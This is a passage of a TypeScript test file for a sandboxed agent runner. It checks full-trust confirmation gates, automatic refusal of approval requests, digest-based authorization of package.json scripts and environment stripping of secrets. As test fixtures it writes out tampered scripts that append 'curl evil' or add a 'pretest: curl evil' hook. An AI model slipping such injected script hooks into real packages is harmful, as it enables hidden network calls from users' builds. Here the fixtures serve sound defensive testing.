    await expect(buildFullTrustMode('t1', '/w', records(false))).rejects.toThrow(/尚未确认/);
    await expect(requireFullTrustConfirmed('t1', records(true))).resolves.toBeUndefined();
    // 没有门禁就不能直接取得完全信任的启动参数
    expect(() => codexLaunchConfig('/w', { capabilities: FULL })).toThrow(/门禁/);
  });

  it('适配器：完全信任但没有确认 → 不启动 app-server，任务失败并说明未获确认', async () => {
    const d = await drive([{ complete: { status: 'completed' } }], { caps: FULL, taskId: 't1', records: records(false) });
    expect(d.exit).toEqual({ kind: 'exited', code: 1 });
    expect(messages(d).join('\n')).toMatch(/完全信任模式未获确认/);
    expect(d.record.some((r) => r.kind === 'argv')).toBe(false);
    const noRecords = await drive([{ complete: { status: 'completed' } }], { caps: FULL });
    expect(noRecords.exit).toEqual({ kind: 'exited', code: 1 });
  });

  it('适配器：完全信任且已确认 → 以 danger-full-access + never 启动，并核验实际生效沙箱', async () => {
    const d = await drive([{ complete: { status: 'completed' } }], { caps: FULL, taskId: 't1', records: records(true) });
    expect(d.exit).toEqual({ kind: 'exited', code: 0 });
    expect(recv(d, 'thread/start')!.msg.params).toMatchObject({ approvalPolicy: 'never', sandbox: 'danger-full-access' });
    const argv = d.record.find((r) => r.kind === 'argv')!.argv as string[];
    expect(argv.some((a) => a.startsWith('default_permissions=') || a.startsWith('sandbox_mode='))).toBe(false);
    expect(d.events.find((e) => e.type === 'isolation')).toMatchObject({ info: { permissions: { mode: 'full_trust', sandboxType: 'dangerFullAccess', approvalPolicy: 'never' } } });
    // 实际生效的沙箱不是 dangerFullAccess → 不开始回合
    const bad = await drive([{ complete: { status: 'completed' } }], { caps: FULL, taskId: 't1', records: records(true), ignore: ['sandbox'] });
    expect(bad.exit).toEqual({ kind: 'exited', code: 1 });
    expect(messages(bad).join('\n')).toMatch(/隔离无法确认.*沙箱类型/s);
    expect(recv(bad, 'turn/start')).toBeUndefined();
  });

  it('标准模式下收到审批请求：一律回 decline，不产生待决定的权限请求，记为异常并进入被拒绝记录', async () => {
    const d = await drive([
      { askCommand: { command: '/bin/zsh -lc "curl https://example.com"', cwd: '/x', reason: 'outside sandbox' } },
      { fileStart: { id: 'f1', changes: [{ path: 'a.txt', kind: 'update' }] } },
      { askFile: { itemId: 'f1' } },
    ]);
    expect(perms(d)).toHaveLength(0); // 没有交给用户决定
    expect(decisions(d)).toEqual([{ decision: 'decline' }, { decision: 'decline' }]);
    expect(JSON.stringify(decisions(d))).not.toMatch(/accept/i);
    expect(d.denied).toHaveLength(2);
    expect(d.denied.every((x) => x.risk === 'high' && /异常的审批请求/.test(x.description))).toBe(true);
    expect(messages(d).join('\n')).toMatch(/异常：施工模式不应出现审批请求，但收到了 2 次/);
  });

  it('完全信任模式下收到审批请求：同样只拒绝', async () => {
    const d = await drive([{ askCommand: { command: '/bin/zsh -lc "ls"', cwd: '/x' } }], { caps: FULL, taskId: 't1', records: records(true) });
    expect(perms(d)).toHaveLength(0);
    expect(decisions(d)).toEqual([{ decision: 'decline' }]);
  });

  it('适配器不会回复任何“以后都允许”类决定：即使审批请求的可选决定里带着它', async () => {
    const d = await drive([{ askCommand: { command: '/bin/zsh -lc "curl x"', cwd: '/x', availableDecisions: ['accept', { acceptWithExecpolicyAmendment: { execpolicy_amendment: ['curl'] } }, 'cancel'] } }]);
    expect(JSON.stringify(decisions(d))).toBe('[{"decision":"decline"}]');
  });
});

describe('B3-1：项目脚本检查进沙箱', () => {
  const pkg = (scripts: Record<string, string>) => JSON.stringify({ name: 'x', scripts });
  const dirWith = async (scripts: Record<string, string>) => {
    const dir = await tmpDir('checks-');
    fs.writeFileSync(path.join(dir, 'package.json'), pkg(scripts));
    return dir;
  };
  const exec = (cfg: { exit?: number; stdout?: string; fail?: string }) => {
    const seen: unknown[] = [];
    return { seen, runner: { runCommand: async (req: unknown) => (seen.push(req), cfg.fail ? ({ status: 'unavailable', reason: cfg.fail } as const) : ({ status: 'ran', exitCode: cfg.exit ?? 0, stdout: cfg.stdout ?? '', stderr: '', timedOut: false, durationMs: 1 } as const)) } };
  };

  it('只有授权摘要一致才运行；脚本经沙箱运行器运行，环境最小化', async () => {
    const dir = await dirWith({ build: 'node build.js', test: 'node test.js' });
    const digest = await scriptsDigest(dir);
    const { runner, seen } = exec({ stdout: 'hi' });
    const r = await runCheck(dir, 'test', runner, { authorizedDigest: digest });
    expect(r).toMatchObject({ name: 'test', status: 'passed' });
    const req = seen[0] as { argv: string[]; env: Record<string, string>; cwd: string };
    expect(req.argv).toEqual(['npm', 'run', 'test', '--silent']);
    expect(req.cwd).toBe(dir);
    // 环境变量只有白名单 + 副本内临时目录 + CI（+ DEVELOPER_DIR）
    expect(Object.keys(req.env).filter((k) => !['PATH', 'HOME', 'LANG', 'LC_ALL', 'TERM', 'TMPDIR', 'CI', 'DEVELOPER_DIR'].includes(k))).toEqual([]);
    expect(req.env.TMPDIR).toBe(path.join(dir, '.studio', 'tmp'));
    expect(fs.existsSync(path.join(dir, '.studio', 'tmp'))).toBe(true);
    const failed = await runCheck(dir, 'build', exec({ exit: 2 }).runner, { authorizedDigest: digest });
    expect(failed).toMatchObject({ status: 'failed', outcome: { kind: 'exited', code: 2 } });
  });

  it('没有授权记录 → 未检查；脚本内容变化（含 pre/post）→ 授权失效，未检查，且不调用运行器', async () => {
    const dir = await dirWith({ test: 'node test.js' });
    const digest = await scriptsDigest(dir);
    const { runner, seen } = exec({});
    expect(await runCheck(dir, 'test', runner, {})).toMatchObject({ status: 'not_available', reason: expect.stringMatching(/没有经过你的批准/) });
    fs.writeFileSync(path.join(dir, 'package.json'), pkg({ test: 'node test.js && curl evil' }));
    expect(await runCheck(dir, 'test', runner, { authorizedDigest: digest })).toMatchObject({ status: 'not_available', reason: expect.stringMatching(/授权已失效/) });
    fs.writeFileSync(path.join(dir, 'package.json'), pkg({ test: 'node test.js', pretest: 'curl evil' }));
    expect(await runCheck(dir, 'test', runner, { authorizedDigest: digest })).toMatchObject({ status: 'not_available' });
    fs.writeFileSync(path.join(dir, 'package.json'), pkg({ test: 'node test.js', lint: 'x' })); // 无关脚本变化不影响
    expect(await runCheck(dir, 'test', runner, { authorizedDigest: digest })).toMatchObject({ status: 'passed' });
    expect(seen).toHaveLength(1);
  });

  it('受限环境不可用 → “未检查”，不回退到宿主运行；没有运行器同理', async () => {
    const dir = await dirWith({ test: 'node -e "require(\'fs\').writeFileSync(\'ran-on-host\',\'x\')"' });
    const digest = await scriptsDigest(dir);
    const r = await runCheck(dir, 'test', exec({ fail: '权限配置无法确认' }).runner, { authorizedDigest: digest });
    expect(r).toMatchObject({ status: 'not_available', reason: expect.stringMatching(/受限运行环境不可用.*权限配置无法确认/) });
    const none = await runCheck(dir, 'test', undefined, { authorizedDigest: digest });
    expect(none).toMatchObject({ status: 'not_available', reason: expect.stringMatching(/不会在你的电脑上直接运行/) });
    expect(fs.existsSync(path.join(dir, 'ran-on-host'))).toBe(false);
  });

  it('占位 test 脚本与缺失脚本不算检查；最小环境只带白名单变量', async () => {
    const dir = await dirWith({ test: 'echo "Error: no test specified" && exit 1' });
    expect(await detectScripts(dir)).toEqual({});
    expect(await runCheck(dir, 'test', exec({}).runner, { authorizedDigest: 'x' })).toMatchObject({ status: 'not_available', reason: expect.stringMatching(/没有 test 脚本/) });
    const env = minimalCheckEnv({ PATH: '/bin', HOME: '/h', SECRET_TOKEN: 's', OPENAI_API_KEY: 'k', LANG: 'C' }, '/w', false);
    expect(env).toEqual({ PATH: '/bin', HOME: '/h', LANG: 'C', TMPDIR: '/w/.studio/tmp', CI: '1' });
  });

  it('Codex 沙箱运行器：核验生效权限后经 command/exec 运行；权限不一致或命令不可用 → unavailable', async () => {
    const dir = await tmpDir('exec-');
    const make = (fakeEnv: Record<string, string>) =>
      new CodexExecutor({ command: process.execPath, prefixArgs: [FAKE_SERVER], env: fakeEnv, discoverMcpServers: async () => ['context7'] }).sandboxRunner;
    const req = { cwd: dir, argv: ['npm', 'run', 'test'], env: { CI: '1' }, timeoutMs: 20_000 };
    expect(await make({ FAKE_EXEC: JSON.stringify({ exitCode: 3, stdout: 'o', stderr: 'e' }) }).runCommand(req)).toMatchObject({ status: 'ran', exitCode: 3, stdout: 'o', stderr: 'e', timedOut: false });
    expect(await make({ FAKE_IGNORE: 'profile' }).runCommand(req)).toMatchObject({ status: 'unavailable', reason: expect.stringMatching(/生效权限与期望不一致.*权限配置档/) });
    expect(await make({ FAKE_EXEC_ERROR: '1' }).runCommand(req)).toMatchObject({ status: 'unavailable', reason: expect.stringMatching(/无法运行命令/) });
    const missing = new CodexExecutor({ command: '/no/such/codex-binary', discoverMcpServers: async () => [] }).sandboxRunner;
    expect(await missing.runCommand(req)).toMatchObject({ status: 'unavailable' });
  });
});
